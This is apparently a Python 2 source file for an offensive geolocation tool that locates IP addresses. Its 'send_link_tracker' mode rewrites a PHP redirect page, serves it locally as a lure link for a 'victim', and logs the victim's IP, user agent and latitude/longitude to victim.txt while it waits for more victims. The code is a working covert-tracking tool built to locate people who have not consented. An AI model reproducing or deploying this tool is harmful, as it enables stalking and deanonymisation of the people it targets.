#!/usr/bin/python2
#-*- coding:utf-8 -*-

import os
import platform
import sys
import subprocess
import threading
import time
import json

try:
    import requests
except ImportError:
    sys.exit("\033[31m[!] Error Requests Module Not Found !")

try:
    from bs4 import BeautifulSoup
except ImportError:
    sys.exit("\033[31m[!] Error BeautifulSoup Not Found !")

try:
    from geopy.geocoders import Nominatim
except ImportError:
    sys.exit("\033[31m[!] Error Geopy Not Found !")

try:
    from datetime import datetime
except ImportError:
    sys.exit("\033[31m[!] Error Datetime Not Found !")


banner = '''
\033[96m
           _ . - = - . _
       . "  \  \   /  /  " .
     ,  \                 /  .
   . \   _,.--~=~"~=~--.._   / .
  ;  _.-"  / \ !   ! / \  "-._  .
 / ,"     / ,` .---. `, \     ". \\
/.'   `~  |   /:::::\   |  ~`   '.\\
\`.  `~   |   \:::::/   | ~`  ~ .'/
 \ `.  `~ \ `, `~~~' ,` /   ~`.' /
  .  "-._  \ / !   ! \ /  _.-"  .
   ./    "=~~.._  _..~~=`"    \.
     ,/         ""          \,
        . _/             \_ . 
          " - ./. .\. - "

            Created By Unam3dd

        [   Github : \033[31mUnam3dd\033[96m    ]
        [   Instagram : \033[31mUnam3dd\033[96m ]
        \033[00m
'''

USER_AGENT_LIST = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31"]

def platform_required():
    if 'Linux' not in platform.platform():
        sys.exit('[*] This is Only For Linux Platform !')

def python_version():
    if sys.version[0] =="3":
        sys.exit("[*] Please Use Python2.7")


def get_address(latlong):
    geolocator = Nominatim(user_agent="get_address_by_latlong")
    location = geolocator.reverse(latlong)
    return location.address

def get_address_raw(latlong):
    geolocator = Nominatim(user_agent="get_address_by_latlong")
    location = geolocator.reverse(latlong)
    return location.raw


def get_geolocation_by_iptracker(ip):
    headers = {
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
    }
    url = "https://www.ip-tracker.org/locator/ip-lookup.php?ip=%s" % (ip)
    r = requests.get(url,headers=headers)
    soup = BeautifulSoup(r.text, "html.parser")
    d = soup.findAll("td", class_="tracking")
    m = d[10].get_text()
    m1 = m.split('/')
    latitude = m1[0]
    longitude = m1[1]
    l = latitude.split('(')[1]
    latitude = l.split(')')[0]
    l2 = longitude.split('(')[1]
    longitude = l2.split(')')[0]
    string_geo = "%s,%s" % (latitude,longitude)
    full_address = get_address(string_geo)
    print("\033[32m[\033[34m+\033[32m] Full Address : %s" % (full_address))
    split_addr = full_address.split(',')
    for ad in split_addr:
        print("\033[32m[\033[34m+\033[32m] INFO : %s " % (ad))

def ipgeo_by_ipinfo(ip):
    try:
        r = requests.get("https://ipinfo.io/%s/geo" % (ip))
        content = r.text
        obj = json.loads(content)
        city = obj['city']
        country = obj['country']
        region = obj['region']
        location = obj['loc']
        print("\033[96m[\033[32m+\033[96m] IP : %s" % (ip))
        print("\033[96m[\033[32m+\033[96m] CITY : %s" % (city))
        print("\033[96m[\033[32m+\033[96m] COUNTRY : %s" % (country))
        print("\033[96m[\033[32m+\033[96m] REGION : %s" % (region))
        print("\033[96m[\033[32m+\033[96m] Location : %s" % (location))
        addr = get_address(location)
        print("\033[96m[\033[32m+\033[96m] Address Full : %s" % (addr))
    except:
        print("\033[96m[\033[31m-\033[96m] Error Send Requests To ipinfo.io")



def check_requirements_path():
    check_server_locator = os.path.exists('server')
    check_php = os.path.exists('/usr/bin/php')
    check_ssh = os.path.exists('/usr/bin/ssh')
    if check_server_locator ==True:
        if check_php ==True:
            pass
        else:
            sys.exit("\033[31m[-] Php Not Found !")
    else:
        sys.exit("\033[31m[-] Requirements Server Locator Not Found !")


def check_logs():
    while True:
        check_geolocate = os.path.exists('server/geolocate.txt')
        if check_geolocate ==True:

            with open('server/ip.txt','r') as a:
                content_ip = a.readlines()
                ip_no_split = content_ip[0] # split \r\n
                ip = ip_no_split.split('\r\n')[0]
                ip_resplit = ip.split('IP: ')[1]

            with open('server/geolocate.txt','r') as f:
                content = f.readlines()
                longitude_no_split = content[0] # split \n
                latitude_no_split = content[1] # split\n
                longitude = longitude_no_split.split('\n')[0]
                latitude = latitude_no_split.split('\n')[0]
                
            print("\033[32m[\033[34m+\033[32m] %s" % (ip))
            print("\033[32m[\033[34m+\033[32m] %s" % (content_ip[1]))
            print("\033[32m[\033[34m+\033[32m] Longitude : %s" % (longitude))
            print("\033[32m[\033[34m+\033[32m] Latitude : %s" % (latitude))
            string_geo = "%s,%s" % (longitude,latitude)
            info_addr = get_address(string_geo)
            print("\033[32m[\033[34m+\033[32m] Informations Of Location : %s" % (info_addr))
            f=open("victim.txt",'w')
            f.write("\n")
            f.write("%s\n" % (ip))
            f.write("%s\n" % (content_ip[1]))
            f.write("Longitude : %s\n" % (longitude))
            f.write("Latitude : %s\n" % (latitude))
            f.close()
            print("\033[32m[\033[34m+\033[32m] Credentials Save As Victim.txt And Map Of Target...Wait Another Victim...")
            f=open('server/ip.txt','r')
            content = f.read()
            f.close()
            replace_content = content.replace(content,"")
            f=open('server/ip.txt','w')
            f.write(replace_content)
            f.close()
            f=open('server/geolocate.txt','r')
            content = f.read()
            f.close()
            replace_content = content.replace(content,"")
            f=open('server/geolocate.txt','w')
            f.write(replace_content)
            f.close()
        else:
            pass

if __name__ == '__main__':
    platform_required()
    python_version()
    print(banner)
    check_requirements_path()
    if len(sys.argv) <2:
        print("usage : %s --help                    | show help" % (sys.argv[0]))
        print("        %s track_by_ipinfo <ip>      | Get Geolocation By IPinfo" % (sys.argv[0]))
        print("        %s track_by_geocoding <ip>   | Get Geolocation By Iptracker (Geocoding) (Recommanded)" % (sys.argv[0]))
        print("        %s send_link_tracker         | Send Link To Victim And Get Exactly Position" % (sys.argv[0]))
        print("        %s get_longlat <long> <lat>  | Return Location Of Longitude Latitude" % (sys.argv[0]))
        print("        %s track_my_info             | Get My Info" % (sys.argv[0]))
    else:
        if sys.argv[1] =="track_by_ipinfo":
            target_ip = sys.argv[2]
            ipgeo_by_ipinfo(target_ip)
        
        elif sys.argv[1] =="track_by_geocoding":
            target_ip = sys.argv[2]
            get_geolocation_by_iptracker(str(target_ip))
        
        elif sys.argv[1] =="get_longlat":
            long = sys.argv[2]
            lat = sys.argv[3]
            addr = get_address("%s,%s" % (long,lat))
        
        elif sys.argv[1] =="track_my_info":
            my_ip = requests.get("https://ifconfig.me/ip")
            ip = my_ip.text
            print("\033[32m[\033[34m+\033[32m] Get My Location By Satelite")
            get_geolocation_by_iptracker(ip)
            print("\033[32m[\033[34m+\033[32m] Get My Location Of Ipaddress By ipinfo.io")
            ipgeo_by_ipinfo(ip)
        
        elif sys.argv[1] =="send_link_tracker":
            check_requirements_path()
            port = raw_input("\033[32m[\033[34m+\033[32m] Enter LPORT > ")
            redirect_link = raw_input("\033[32m[\033[34m+\033[32m] Enter Redirect Link > ")
            os.system('cd server/ && cp get.php get.php.save')
            f=open('server/get.php','r')
            content = f.read()
            f.close()
            replace_link = content.replace("https://google.com",redirect_link)
            f=open('server/get.php','w')
            f.write(replace_link)
            f.close()
            php_server = os.system('cd server/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &' % (port))
            if php_server ==0:
                try:
                    print("\033[32m[\033[34m+\033[32m] Php Server Started...")
                    print("\033[32m[\033[34m+\033[32m] Link => http://127.0.0.1:%s" % (port))
                    print("\033[32m[\033[34m+\033[32m] Wait Credentials.... CTRL+C For Exit !")
                    check_logs()
                except KeyboardInterrupt:
                    os.system('pkill -f php')
                    os.system('cd server/ && rm get.php && cp get.php.save get.php')
            else:
                print("\033[31m[!] Php Server Not Started Error ")
        else:
            print("\033[31m[!] Error Options !")
